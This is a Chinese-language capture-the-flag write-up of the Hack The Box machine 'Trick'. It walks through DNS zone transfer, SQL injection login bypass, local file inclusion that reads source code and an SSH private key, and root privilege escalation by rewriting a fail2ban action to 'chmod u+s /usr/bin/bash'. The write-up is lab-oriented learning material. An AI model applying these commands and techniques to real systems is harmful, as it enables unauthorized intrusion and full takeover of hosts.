nmap扫描结果

![](https://img.mi3aka.eu.org/2022/08/535a15a0f9d5a04d4f192bdbe11e5614.png)

---

1. smtp可交互

[SMTP 协议 25 端口渗透测试记录](https://www.sqlsec.com/2017/08/smtp.html)

![](https://img.mi3aka.eu.org/2022/08/0d04571f17caaa1cc735b4d8946ceda3.png)

试了一下,好像没有得到有价值的信息

2. wfuzz

`./wfuzz -c -w /home/xxx/SecTools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" --hh 185`

![](https://img.mi3aka.eu.org/2022/08/8c1ed8f8d43bae4b9354413e01c8d81b.png)

全都是200...

3. DNS域传送

>53端口处于开放状态,且存在服务

`dig @10.10.11.166 -t axfr trick.htb`

![](https://img.mi3aka.eu.org/2022/08/2effaf65d0c3e8be4bd7474776c09343.png)

得到一个域名`preprod-payroll.trick.htb`

![](https://img.mi3aka.eu.org/2022/08/e25e6a01e0a7d62602c84a6bf9688860.png)

存在注入点

![](https://img.mi3aka.eu.org/2022/08/5ed23bb0faf96156dd2d16a2a3376b22.png)

万能密码进入后台

![](https://img.mi3aka.eu.org/2022/08/5acf85b979b6c102f504e68eee9615ee.png)

后台看了一圈,没找到上传点,继续利用注入

得到`users`表中的数据

`[*] , , 0, 1, Administrator, SuperGucciRainbowCake, 1, Enemigosss`

![](https://img.mi3aka.eu.org/2022/08/fa3d61dafb89df0e71fd728a9b2a54a6.png)

用`SuperGucciRainbowCake`作为ssh密码失败

---

重新分析网站,发现该网站切换页面的方式为`index.php?page=xx`,推测其切换方式为`include($page.".php");`

传入`index.php?page=php://filter/convert.base64-encode/resource=index`成功读取到`index.php`的源代码

`index.php`

```php
...
<?php
	session_start();
  if(!isset($_SESSION['login_id']))
    header('location:login.php');
 include('./header.php'); 
 // include('./auth.php'); 
 ?>
...
```

`login.php`

```php
...
<?php include('./header.php'); ?>
<?php include('./db_connect.php'); ?>
<?php 
session_start();
if(isset($_SESSION['login_id']))
header("location:index.php?page=home");

?>
...
<script>
	$('#login-form').submit(function(e){
		e.preventDefault()
		$('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
		if($(this).find('.alert-danger').length > 0 )
			$(this).find('.alert-danger').remove();
		$.ajax({
			url:'ajax.php?action=login',
			method:'POST',
			data:$(this).serialize(),
			error:err=>{
				console.log(err)
		$('#login-form button[type="button"]').removeAttr('disabled').html('Login');

			},
			success:function(resp){
				if(resp == 1){
					location.href ='index.php?page=home';
				}else if(resp == 2){
					location.href ='voting.php';
				}else{
					$('#login-form').prepend('<div class="alert alert-danger">Username or password is incorrect.</div>')
					$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
				}
			}
		})
	})
</script>
```

`ajax.php`

```php
<?php
ob_start();
$action = $_GET['action'];
include 'admin_class.php';
$crud = new Action();

if($action == 'login'){
	$login = $crud->login();
	if($login)
		echo $login;
}
if($action == 'login2'){
	$login = $crud->login2();
	if($login)
		echo $login;
}
if($action == 'logout'){
	$logout = $crud->logout();
	if($logout)
		echo $logout;
}
if($action == 'logout2'){
	$logout = $crud->logout2();
	if($logout)
		echo $logout;
}
if($action == 'save_user'){
	$save = $crud->save_user();
	if($save)
		echo $save;
}
if($action == 'delete_user'){
	$save = $crud->delete_user();
	if($save)
		echo $save;
}
if($action == 'signup'){
	$save = $crud->signup();
	if($save)
		echo $save;
}
if($action == "save_settings"){
	$save = $crud->save_settings();
	if($save)
		echo $save;
}
...
if($action == "save_position"){
	$save = $crud->save_position();
	if($save)
		echo $save;
}
...
```

`admin_class.php`

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';
    
    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}

	function login(){
		extract($_POST);
		$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".$password."' ");
		if($qry->num_rows > 0){
			foreach ($qry->fetch_array() as $key => $value) {
				if($key != 'passwors' && !is_numeric($key))
					$_SESSION['login_'.$key] = $value;
			}
				return 1;
		}else{
			return 3;
		}
	}
	function login2(){
		extract($_POST);
		$qry = $this->db->query("SELECT * FROM users where username = '".$email."' and password = '".md5($password)."' ");
		if($qry->num_rows > 0){
			foreach ($qry->fetch_array() as $key => $value) {
				if($key != 'passwors' && !is_numeric($key))
					$_SESSION['login_'.$key] = $value;
			}
				return 1;
		}else{
			return 3;
		}
	}
	function logout(){
		session_destroy();
		foreach ($_SESSION as $key => $value) {
			unset($_SESSION[$key]);
		}
		header("location:login.php");
	}
	function logout2(){
		session_destroy();
		foreach ($_SESSION as $key => $value) {
			unset($_SESSION[$key]);
		}
		header("location:../index.php");
	}

	function save_user(){
		...
	}
	function signup(){
		...
	}

	function save_settings(){//文件上传
		extract($_POST);
		$data = " name = '".str_replace("'","&#x2019;",$name)."' ";
		$data .= ", email = '$email' ";
		$data .= ", contact = '$contact' ";
		$data .= ", about_content = '".htmlentities(str_replace("'","&#x2019;",$about))."' ";
		if($_FILES['img']['tmp_name'] != ''){
						$fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
						$move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/img/'. $fname);
					$data .= ", cover_img = '$fname' ";

		}
		
		// echo "INSERT INTO system_settings set ".$data;
		$chk = $this->db->query("SELECT * FROM system_settings");
		if($chk->num_rows > 0){
			$save = $this->db->query("UPDATE system_settings set ".$data);
		}else{
			$save = $this->db->query("INSERT INTO system_settings set ".$data);
		}
		if($save){
		$query = $this->db->query("SELECT * FROM system_settings limit 1")->fetch_array();
		foreach ($query as $key => $value) {
			if(!is_numeric($key))
				$_SESSION['setting_'.$key] = $value;
		}

			return 1;
				}
	}

	
	function save_employee(){
        ...
	}
	function delete_employee(){
		...
	}
	
	function save_department(){
		...
	}
	function delete_department(){
		...
	}
	function save_position(){
		extract($_POST);
		$data =" name='$name' ";
		$data .=", department_id = '$department_id' ";
		

		if(empty($id)){
			$save = $this->db->query("INSERT INTO position set ".$data);
		}else{
			$save = $this->db->query("UPDATE position set ".$data." where id=".$id);
		}
		if($save)
			return 1;
	}
	function delete_position(){
		...
	}
	function save_allowances(){
		...
	}
	function delete_allowances(){
		...
	}
	function save_employee_allowance(){
		...
	}
	function delete_employee_allowance(){
		...
	}
	function save_deductions(){
		...
	}
	function delete_deductions(){
		...
	}
	function save_employee_deduction(){
		...
	}
	function delete_employee_deduction(){
		...
	}
	function save_employee_attendance(){
		...
	}
	function delete_employee_attendance(){
		...
	}
	function delete_employee_attendance_single(){
		...
	}
	function save_payroll(){
		...
	}
	function delete_payroll(){
		...
	}
	function calculate_payroll(){
		...
	}
}
```

`db_connect.php`

```php
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

1. `save_settings`存在文件上传,上传方式可参考`save_position`

![](https://img.mi3aka.eu.org/2022/08/953e26e03e96ee389ad826f2ddc9d7d3.png)

但是进行文件上传时,`move_uploaded_file`提示权限不足

![](https://img.mi3aka.eu.org/2022/08/b6b4d24af5f74e1dc49bee2700405ca3.png)

2. 得到数据库连接账号和密码`remo`,`TrulyImpossiblePasswordLmao123`

好像也不能用来ssh链接

---

爆破`/var/www/xxx/index.php`,字典使用`SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

![](https://img.mi3aka.eu.org/2022/08/87cb8d596aca078af09c0ec965e726a3.png)

存在另一个网站路径`market`,结合`/var/www/payroll/index`和`preprod-payroll.trick.htb`推测域名为`preprod-market.trick.htb`或者`market.trick.htb`,但是修改`hosts`后发现这两个域名与直接用ip访问没有区别

`/var/www/market/index.php`

```php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
	include("/var/www/market/".str_replace("../","",$file));
}
?>
```

>问题来了,同样都是使用`page`参数,假如用`payroll/index.php`去包含`market/index.php`会导致`market/index.php`使用相同的`page`参数,那就白给了...

---

去`breached.to`看了一下老哥们的讨论,发现写进`hosts`中的域名是`preprod-marketing.trick.htb`(无语...

![](https://img.mi3aka.eu.org/2022/08/f459fd9430a6792337c01233a4e83e4e.png)

![](https://img.mi3aka.eu.org/2022/08/498859b636ee35c0df8ec3f98e3cf2bb.png)

用`michael`作为用户名测试了一下上面的密码链接ssh,发现还是不行

可以读取`id_rsa`

![](https://img.mi3aka.eu.org/2022/08/7f20bd88bd2189464a34b22f59e32adc.png)

![](https://img.mi3aka.eu.org/2022/08/fca040c1d31762114a3e4b59afa3e938.png)

---

![](https://img.mi3aka.eu.org/2022/09/dc310b097605cdf1f624becc30441e91.png)

`sudo -l`显示可以用`root`身份执行`/etc/init.d/fail2ban restart`

参考文章

[Privilege Escalation with fail2ban nopasswd](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)

[Privilege Escalation via fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

`find /etc/ -writable -ls`

![](https://img.mi3aka.eu.org/2022/09/e8dcec8ff94035945a1f06d7b2e462a6.png)

尝试直接修改`iptables-multiport.conf`,发现权限不足

![](https://img.mi3aka.eu.org/2022/09/bdcd47df32e1836eb151e46daaf3662e.png)

```
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ ls -alh iptables-multiport.conf
-rw-r--r-- 1 michael michael 1.4K Sep  1 05:11 iptables-multiport.conf
```

![](https://img.mi3aka.eu.org/2022/09/c602d6f5b09301aff020de47d5e0c82a.png)

将封禁的action替换`chmod u+s /usr/bin/bash`

![](https://img.mi3aka.eu.org/2022/09/f5c0e9c52ed053635f46173a3e35dbfc.png)

后台使用`nmap -p 22 --script=ssh-brute --script-args userdb=2.txt,passdb=1.txt 10.10.11.166`对ssh进行爆破

![](https://img.mi3aka.eu.org/2022/09/7efca9c356aecab4af3a484aa15e648f.png)

![](https://img.mi3aka.eu.org/2022/09/3d80564cb6a1d7f51891fdae867f6c50.png)

对于`-p`参数的解释

![](https://img.mi3aka.eu.org/2022/09/6ed1f3fa5172d45c5b2305d6ab9234b6.png)

```
      -p  Turned on whenever the real and effective user ids do not match.
          Disables processing of the $ENV file and importing of shell
          functions.  Turning this option off causes the effective uid and
          gid to be set to the real uid and gid.


当真实有效的用户 id 不匹配时打开。禁用 $ENV 文件的处理和 shell 函数的导入。 关闭此选项会使有效的 uid 和 gid 设置为真实的 uid 和 gid。
```